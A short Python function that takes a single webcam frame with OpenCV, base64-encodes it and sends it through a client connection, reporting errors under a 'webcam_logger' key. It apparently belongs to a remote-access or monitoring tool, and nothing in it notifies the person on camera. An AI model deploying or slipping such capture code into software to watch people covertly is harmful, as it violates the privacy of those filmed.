import cv2
import base64

def send_webcam_frame(client, converter):
    try:
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            raise Exception("No webcam detected")
        
        ret, frame = cap.read()
        cap.release()

        if not ret:
            raise Exception("Failed to capture image from webcam")

        _, buffer = cv2.imencode('.png', frame)
        webcam_data = buffer.tobytes()

        webcam_data_base64 = base64.b64encode(webcam_data).decode("utf-8")
        
        client.send_message(converter.encode({"webcam": webcam_data_base64}))

    except Exception as e:
        client.send_message(converter.encode({"webcam_logger": str(e)}))